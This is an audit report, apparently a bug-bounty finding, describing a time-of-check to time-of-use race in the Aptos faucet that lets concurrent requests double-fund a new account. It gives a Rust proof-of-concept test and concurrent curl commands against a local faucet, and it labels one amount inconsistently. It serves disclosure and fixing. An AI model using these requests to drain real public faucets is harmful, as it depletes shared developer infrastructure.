# Audit Report

## Title
Time-of-Check to Time-of-Use Race Condition Enabling Faucet Double-Funding

## Summary
A TOCTOU (Time-of-Check to Time-of-Use) race condition exists in the faucet's account funding logic that allows concurrent requests for the same account to bypass the "account already exists" check, resulting in double-funding and accelerated depletion of faucet resources.

## Finding Description

The vulnerability exists in the interaction between the faucet's queue management system and account existence validation. The core issue spans two components: [1](#0-0) [2](#0-1) 

**Attack Flow:**

1. An attacker initiates two concurrent funding requests (A and B) for the same new account address
2. Both requests enter `update_sequence_numbers()` and fetch the receiver's sequence number via `get_sequence_numbers()` - both see `None` (account doesn't exist)
3. Request A reaches the front of the queue first, passes the existence check, and submits a transaction that creates and funds the account
4. Request B waits in the queue with **stale** `receiver_seq_num = None` from step 2
5. Request B eventually exits the queue and checks `if receiver_seq_num.is_some()` - this check passes because it uses the stale `None` value fetched before queuing
6. Request B submits another funding transaction
7. The on-chain `aptos_account::transfer` function detects the account exists and simply transfers additional funds instead of rejecting [3](#0-2) 

The Move function's behavior allows transfers to existing accounts, which is correct for normal operations but problematic when the faucet's stale check allows a second funding request through.

The critical gap is that sequence numbers are fetched **once** at the start of `update_sequence_numbers()` but the request may wait in queue for extended periods before the check is performed, making the data stale.

## Impact Explanation

This qualifies as **Medium Severity** under the Aptos bug bounty program criteria: "Limited funds loss or manipulation."

**Quantified Impact:**
- Each successful double-funding attack drains 2x the intended amount from the faucet
- On devnet/testnet faucets with rate limiting per IP but no per-account enforcement, an attacker could automate this to rapidly deplete faucet funds
- For a faucet configured to fund 100 APT per request, successful concurrent requests yield 200 APT
- This creates operational issues requiring manual faucet refills and potential service degradation

**State Inconsistency:**
The faucet's transaction tracking expects one funding transaction per new account, but this vulnerability allows multiple transactions, breaking accounting invariants and potentially causing discrepancies in monitoring systems.

## Likelihood Explanation

**High Likelihood** - The vulnerability is easily exploitable:

**Attacker Requirements:**
- Ability to make HTTP requests to the faucet endpoint (available to any user)
- Basic knowledge of concurrent programming to send simultaneous requests
- No authentication bypass or complex exploit chain required

**Triggering Conditions:**
- The race window exists whenever the faucet has any load (queue is non-empty)
- No special timing precision needed - requests just need to arrive before the first completes on-chain
- Works on both `TransferFunder` and `MintFunder` implementations

**Exploitation Complexity:** Trivial - can be demonstrated with a simple script making concurrent curl requests or a basic async HTTP client.

## Recommendation

**Root Cause:** The receiver sequence number is fetched before entering the queue but validated after exiting, allowing stale data to bypass the existence check.

**Recommended Fix:** Re-fetch the receiver sequence number **after** exiting the queue and before performing the existence check:

```rust
// In update_sequence_numbers(), after line 264 when request exits queue:
// Re-fetch receiver sequence number to ensure fresh data
let (_, fresh_receiver_seq) = get_sequence_numbers(client, funder_account, receiver_address).await?;

// Update the return value to use fresh data
Ok((funder_seq, fresh_receiver_seq))
```

**Alternative Defense-in-Depth Measures:**
1. Add per-account locking in the faucet to serialize all requests for the same receiver
2. Implement server-side deduplication based on receiver address within a time window
3. Add explicit on-chain checks in custom faucet Move functions that reject duplicate funding attempts
4. Track funded accounts in persistent storage and check before processing

## Proof of Concept

```rust
// Rust PoC demonstrating the race condition
use std::sync::Arc;
use tokio::task::JoinSet;
use aptos_sdk::types::account_address::AccountAddress;

#[tokio::test]
async fn test_concurrent_funding_race_condition() {
    // Setup faucet client pointing to local/dev faucet
    let faucet_url = "http://localhost:8081";
    let client = reqwest::Client::new();
    
    // Generate a fresh account address
    let receiver = AccountAddress::random();
    
    // Launch 2 concurrent funding requests
    let mut tasks = JoinSet::new();
    for i in 0..2 {
        let client_clone = client.clone();
        let receiver_clone = receiver;
        tasks.spawn(async move {
            let response = client_clone
                .post(format!("{}/fund", faucet_url))
                .json(&serde_json::json!({
                    "address": receiver_clone.to_hex_literal(),
                    "amount": 100_000_000_000u64
                }))
                .send()
                .await;
            println!("Request {} result: {:?}", i, response);
            response
        });
    }
    
    // Wait for both requests
    let mut success_count = 0;
    while let Some(result) = tasks.join_next().await {
        if result.unwrap().unwrap().status().is_success() {
            success_count += 1;
        }
    }
    
    // If race condition exists, both requests succeed
    assert_eq!(success_count, 2, "Both concurrent requests should succeed due to TOCTOU");
    
    // Verify on-chain balance is 2x expected amount
    // (requires API client to check balance - omitted for brevity)
}
```

**Manual Testing Steps:**
1. Start a local faucet: `cargo run -p aptos-faucet`
2. Execute concurrent requests:
```bash
ADDR="0x$(openssl rand -hex 32)"
curl -X POST "http://localhost:8081/fund" -H "Content-Type: application/json" \
  -d "{\"address\":\"$ADDR\",\"amount\":100000000000}" &
curl -X POST "http://localhost:8081/fund" -H "Content-Type: application/json" \
  -d "{\"address\":\"$ADDR\",\"amount\":100000000000}" &
wait
```
3. Query account balance - should show 200 APT instead of intended 100 APT

## Notes

This vulnerability affects all faucet deployments (devnet, testnet, local development environments) using the standard Aptos faucet implementation. Production mainnet does not use faucets, so mainnet funds are not at risk. However, this represents a significant operational security issue for development infrastructure and can be used to grief public testnets by draining their faucet supplies.

### Citations

**File:** crates/aptos-faucet/core/src/funder/common.rs (L203-306)
```rust
pub async fn update_sequence_numbers(
    client: &Client,
    funder_account: &RwLock<LocalAccount>,
    // Each asset has its own queue: HashMap<asset_name, Vec<(AccountAddress, u64)>>
    outstanding_requests: &RwLock<HashMap<String, Vec<(AccountAddress, u64)>>>,
    receiver_address: AccountAddress,
    amount: u64,
    wait_for_outstanding_txns_secs: u64,
    asset_name: &str,
) -> Result<(u64, Option<u64>), AptosTapError> {
    let (mut funder_seq, mut receiver_seq) =
        get_sequence_numbers(client, funder_account, receiver_address).await?;
    let our_funder_seq = {
        let funder_account = funder_account.write().await;

        // If the onchain sequence_number is greater than what we have, update our
        // sequence_numbers
        if funder_seq > funder_account.sequence_number() {
            funder_account.set_sequence_number(funder_seq);
        }
        funder_account.sequence_number()
    };

    let _resetter = NumOutstandingTransactionsResetter;

    let mut set_outstanding = false;
    let request_key = (receiver_address, amount);

    // We shouldn't have too many outstanding txns
    for _ in 0..(wait_for_outstanding_txns_secs * 2) {
        if our_funder_seq < funder_seq + MAX_NUM_OUTSTANDING_TRANSACTIONS {
            // Enforce a stronger ordering of priorities based upon the MintParams that arrived
            // first. Then put the other folks to sleep to try again until the queue fills up.
            if !set_outstanding {
                let mut requests_map = outstanding_requests.write().await;
                let queue = requests_map
                    .entry(asset_name.to_string())
                    .or_insert_with(Vec::new);
                queue.push(request_key);
                set_outstanding = true;
            }

            // Check if this request is at the front of the queue for this asset
            let requests_map = outstanding_requests.read().await;
            let is_at_front = if let Some(queue) = requests_map.get(asset_name) {
                queue.first() == Some(&request_key)
            } else {
                false
            };

            if is_at_front {
                // There might have been two requests with the same parameters, so we ensure that
                // we only pop off one of them. We do a read lock first since that is cheap,
                // followed by a write lock.
                drop(requests_map);
                let mut requests_map = outstanding_requests.write().await;
                if let Some(queue) = requests_map.get_mut(asset_name) {
                    if queue.first() == Some(&request_key) {
                        queue.remove(0);
                    }
                }
                break;
            }
            tokio::time::sleep(tokio::time::Duration::from_millis(1)).await;
            continue;
        }
        let num_outstanding = our_funder_seq - funder_seq;

        sample!(
            SampleRate::Duration(Duration::from_secs(2)),
            warn!(
                "We have too many outstanding transactions: {}. Sleeping to let the system catchup.",
                num_outstanding
            );
        );

        // Report the number of outstanding transactions.
        NUM_OUTSTANDING_TRANSACTIONS.set(num_outstanding as i64);

        tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
        (funder_seq, receiver_seq) =
            get_sequence_numbers(client, funder_account, receiver_address).await?;
    }

    // If after 30 seconds we still have not caught up, we are likely unhealthy.
    if our_funder_seq >= funder_seq + MAX_NUM_OUTSTANDING_TRANSACTIONS {
        error!("We are unhealthy, transactions have likely expired.");
        let funder_account = funder_account.write().await;
        if funder_account.sequence_number() >= funder_seq + MAX_NUM_OUTSTANDING_TRANSACTIONS {
            info!("Resetting the sequence number counter.");
            funder_account.set_sequence_number(funder_seq);
        } else {
            info!("Someone else reset the sequence number counter ahead of us.");
        }
    }

    // After this point we report 0 outstanding transactions. This happens by virtue
    // of the NumOutstandingTransactionsResetter dropping out of scope. We do it this
    // way instead of explicitly calling it here because if the caller hangs up part
    // way through the request, the future for the request handler stops getting polled,
    // meaning we'd never make it here. Leveraging Drop makes sure it always happens.

    Ok((funder_seq, receiver_seq))
}
```

**File:** crates/aptos-faucet/core/src/funder/transfer.rs (L263-331)
```rust
    async fn fund(
        &self,
        amount: Option<u64>,
        receiver_address: AccountAddress,
        _asset: Option<String>,
        check_only: bool,
        did_bypass_checkers: bool,
    ) -> Result<Vec<SignedTransaction>, AptosTapError> {
        // Confirm the funder has sufficient balance, return a 500 if not. This
        // will only happen briefly, soon after we get into this state the LB
        // will deregister this instance based on the health check responses
        // being returned from `/`.
        self.is_healthy_as_result().await?;

        let client = self.get_api_client();

        // Determine amount to fund.
        let amount = self.get_amount(amount, did_bypass_checkers);

        // Update the sequence numbers of the accounts.
        // TransferFunder always uses DEFAULT_ASSET_NAME since it only handles a single asset.
        let (_funder_seq_num, receiver_seq_num) = update_sequence_numbers(
            &client,
            &self.faucet_account,
            &self.outstanding_requests,
            receiver_address,
            amount,
            self.wait_for_outstanding_txns_secs,
            DEFAULT_ASSET_NAME,
        )
        .await?;

        // When updating the sequence numbers, we expect that the receiver sequence
        // number should be None, because the account should not exist yet.
        if receiver_seq_num.is_some() {
            return Err(AptosTapError::new(
                "Account ineligible".to_string(),
                AptosTapErrorCode::Rejected,
            )
            .rejection_reasons(vec![RejectionReason::new(
                format!("Account {} already exists", receiver_address),
                RejectionReasonCode::AccountAlreadyExists,
            )]));
        }

        // This Move function checks if the account exists, and if it does,
        // returns an error. If not, it creates the account and transfers the
        // requested amount of coins to it.
        let transactions = if check_only {
            vec![]
        } else {
            let txn = self
                .execute_transaction(
                    &client,
                    aptos_stdlib::aptos_account_transfer(receiver_address, amount),
                    &receiver_address,
                )
                .await?;
            info!(
                hash = txn.committed_hash().to_hex_literal(),
                address = receiver_address,
                amount = amount,
                event = "transaction_submitted"
            );
            vec![txn]
        };

        Ok(transactions)
    }
```

**File:** aptos-move/framework/aptos-framework/sources/aptos_account.move (L82-97)
```text
    public entry fun transfer(source: &signer, to: address, amount: u64) {
        if (!account::exists_at(to)) {
            create_account(to)
        };

        if (features::operations_default_to_fa_apt_store_enabled()) {
            fungible_transfer_only(source, to, amount)
        } else {
            // Resource accounts can be created without registering them to receive APT.
            // This conveniently does the registration if necessary.
            if (!coin::is_account_registered<AptosCoin>(to)) {
                coin::register<AptosCoin>(&create_signer(to));
            };
            coin::transfer<AptosCoin>(source, to, amount)
        }
    }
```
